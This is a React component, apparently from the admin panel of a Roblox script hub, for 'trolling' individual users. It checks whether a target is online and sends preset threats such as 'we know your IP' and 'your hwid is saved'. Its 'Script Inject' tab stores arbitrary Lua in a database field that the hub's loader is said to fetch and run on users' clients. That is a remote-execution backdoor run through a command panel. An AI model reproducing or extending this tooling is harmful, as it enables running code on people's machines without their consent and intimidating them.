import { useState, useEffect } from 'react';
import { MessageCircle, Wifi, WifiOff, Loader2, Send, X, Code, RotateCcw } from 'lucide-react';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';

interface TrollPanelProps {
  userId: number;
  username: string;
  onClose: () => void;
}

type Tab = 'message' | 'script';

export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
  const [tab, setTab]           = useState<Tab>('message');
  const [online, setOnline]     = useState<boolean | null>(null);
  const [checking, setChecking] = useState(true);
  const [message, setMessage]   = useState('');
  const [sending, setSending]   = useState(false);
  const [sent, setSent]         = useState<string[]>([]);

  const [script, setScript]       = useState('');
  const [gameName, setGameName]   = useState('');
  const [games, setGames]         = useState<string[]>([]);
  const [injecting, setInjecting] = useState(false);

  useEffect(() => {
    checkOnline();
    loadGames();
  }, [userId]);

  const checkOnline = async () => {
    setChecking(true);
    try {
      const res = await fetch(`/api/roblox`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: `/v1/presence/users`,
          method: 'POST',
          body: { userIds: [userId] },
          domain: 'https://presence.roblox.com',
        }),
      });
      if (res.ok) {
        const data = await res.json();
        const presence = data?.userPresences?.[0];
        setOnline((presence?.userPresenceType ?? 0) >= 2);
      } else {
        setOnline(null);
      }
    } catch {
      setOnline(null);
    }
    setChecking(false);
  };

  const loadGames = async () => {
    const { data } = await supabase.from('game_status').select('game_name').order('game_name');
    if (data) setGames(data.map((r: any) => r.game_name));
  };

  const sendMessage = async () => {
    if (!message.trim()) return;
    setSending(true);
    try {
      const res = await fetch('/api/roblox', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: `/v1/messages`,
          method: 'POST',
          body: { userId, subject: 'vhxLUA', body: message.trim() },
        }),
      });
      if (res.ok) {
        setSent(prev => [...prev, message.trim()]);
        setMessage('');
        toast.success(`Message sent to @${username} 😈`);
      } else {
        toast.error('Failed — Roblox API requires auth cookie');
      }
    } catch {
      toast.error('Request failed');
    }
    setSending(false);
  };

  const injectScript = async () => {
    if (!script.trim()) return toast.error('Enter a script');
    if (!gameName) return toast.error('Select a game');
    setInjecting(true);
    const { error } = await supabase
      .from('game_status')
      .update({ execute_script: script.trim() })
      .eq('game_name', gameName);
    if (error) {
      toast.error(error.message);
    } else {
      toast.success(`Script injected into ${gameName} 💀`);
    }
    setInjecting(false);
  };

  const clearScript = async () => {
    if (!gameName) return toast.error('Select a game');
    await supabase.from('game_status').update({ execute_script: null }).eq('game_name', gameName);
    setScript('');
    toast.success('Script cleared');
  };

  const presets = [
    '👀 I can see you',
    'nice executor lol',
    'vhxLUA says hi 😈',
    'we know your IP 💀',
    'your hwid is saved 😇',
  ];

  const s  = { backgroundColor: 'var(--color-surface2)', borderColor: 'var(--color-border)' };
  const st = { color: 'var(--color-text)' };
  const sm = { color: 'var(--color-muted)' };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4"
      style={{ backgroundColor: 'rgba(0,0,0,0.7)' }}>
      <div className="w-full max-w-md rounded-2xl border shadow-2xl overflow-hidden"
        style={{ backgroundColor: 'var(--color-surface)', borderColor: 'var(--color-border)' }}>

        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b"
          style={{ borderColor: 'var(--color-border)' }}>
          <div className="flex items-center gap-2">
            <MessageCircle className="w-4 h-4 text-purple-400" />
            <p className="text-sm font-semibold" style={st}>Troll @{username}</p>
          </div>
          <button onClick={onClose} style={sm}><X className="w-4 h-4" /></button>
        </div>

        {/* Online status */}
        <div className="px-5 pt-4">
          <div className="flex items-center gap-3 p-3 rounded-xl border" style={s}>
            {checking
              ? <Loader2 className="w-4 h-4 animate-spin text-blue-400" />
              : online === true
                ? <Wifi className="w-4 h-4 text-emerald-400" />
                : <WifiOff className="w-4 h-4 text-red-400" />
            }
            <div>
              <p className="text-xs font-semibold" style={st}>
                {checking ? 'Checking...' : online === true ? 'In-Game 🟢' : online === false ? 'Offline 🔴' : 'Unknown'}
              </p>
              <p className="text-[10px]" style={sm}>Roblox ID: {userId}</p>
            </div>
            <button onClick={checkOnline} className="ml-auto text-[10px] px-2 py-1 rounded-lg border hover:opacity-80"
              style={{ borderColor: 'var(--color-border)', ...sm }}>
              Refresh
            </button>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-1 px-5 pt-4">
          {(['message', 'script'] as Tab[]).map(t => (
            <button key={t} onClick={() => setTab(t)}
              className="flex-1 py-1.5 rounded-lg text-xs font-medium transition-all capitalize"
              style={tab === t
                ? { backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }
                : { ...s, border: '1px solid var(--color-border)', ...sm }
              }>
              {t === 'message' ? '💬 Message' : '💉 Script Inject'}
            </button>
          ))}
        </div>

        <div className="p-5 space-y-4">
          {tab === 'message' && (
            <>
              <div>
                <p className="text-[10px] font-medium mb-2" style={sm}>QUICK MESSAGES</p>
                <div className="flex flex-wrap gap-1.5">
                  {presets.map(p => (
                    <button key={p} onClick={() => setMessage(p)}
                      className="text-[10px] px-2.5 py-1 rounded-full border hover:opacity-80"
                      style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
                      {p}
                    </button>
                  ))}
                </div>
              </div>
              <div className="space-y-2">
                <p className="text-[10px] font-medium" style={sm}>CUSTOM MESSAGE</p>
                <textarea
                  value={message}
                  onChange={e => setMessage(e.target.value)}
                  placeholder="Type a message..."
                  maxLength={200}
                  rows={3}
                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none resize-none"
                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}
                />
                <button onClick={sendMessage} disabled={sending || !message.trim()}
                  className="w-full py-2 rounded-xl text-xs font-medium flex items-center justify-center gap-2 transition-all disabled:opacity-40"
                  style={{ backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }}>
                  {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
                  Send Message
                </button>
              </div>
              {sent.length > 0 && (
                <div className="space-y-1">
                  <p className="text-[10px] font-medium" style={sm}>SENT</p>
                  {sent.map((m, i) => (
                    <div key={i} className="text-[10px] px-2.5 py-1.5 rounded-lg"
                      style={{ backgroundColor: 'rgba(168,85,247,0.08)', ...st }}>{m}</div>
                  ))}
                </div>
              )}
            </>
          )}

          {tab === 'script' && (
            <>
              <div className="space-y-2">
                <p className="text-[10px] font-medium" style={sm}>TARGET GAME</p>
                <select value={gameName} onChange={e => setGameName(e.target.value)}
                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none"
                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
                  <option value="">Select game...</option>
                  {games.map(g => <option key={g} value={g}>{g}</option>)}
                </select>
              </div>
              <div className="space-y-2">
                <p className="text-[10px] font-medium" style={sm}>SCRIPT TO INJECT</p>
                <textarea
                  value={script}
                  onChange={e => setScript(e.target.value)}
                  placeholder={`-- Script will execute in ${gameName || 'selected game'}\nprint("hello from vhxLUA")`}
                  rows={6}
                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none resize-none font-mono"
                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}
                />
              </div>
              <div className="flex gap-2">
                <button onClick={injectScript} disabled={injecting || !script.trim() || !gameName}
                  className="flex-1 py-2 rounded-xl text-xs font-medium flex items-center justify-center gap-2 transition-all disabled:opacity-40"
                  style={{ backgroundColor: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)' }}>
                  {injecting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Code className="w-3.5 h-3.5" />}
                  Inject Script
                </button>
                <button onClick={clearScript} disabled={!gameName}
                  className="px-3 py-2 rounded-xl text-xs font-medium flex items-center gap-1.5 transition-all disabled:opacity-40"
                  style={{ ...s, border: '1px solid var(--color-border)', ...sm }}>
                  <RotateCcw className="w-3.5 h-3.5" /> Clear
                </button>
              </div>
              <p className="text-[10px]" style={sm}>
                💡 Script is stored in <code className="text-purple-400">game_status.execute_script</code> — your mainloader must read and run it on next execution.
              </p>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
